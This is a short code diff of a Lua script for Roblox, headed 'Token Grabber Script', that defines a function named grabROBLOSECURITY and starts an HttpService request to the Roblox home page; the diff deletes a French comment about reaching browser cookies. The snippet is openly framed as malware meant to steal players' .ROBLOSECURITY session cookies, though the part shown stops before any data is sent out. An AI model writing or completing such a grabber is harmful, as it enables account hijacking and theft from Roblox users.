@@ -1,10 +1,8 @@
--- Token Grabber Script
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
 local function grabROBLOSECURITY()
     local success, result = pcall(function()
-        -- Tente d'accéder aux cookies du navigateur via une requête
         local response = HttpService:RequestAsync({
             Url = "https://www.roblox.com/home",
             Method = "GET",
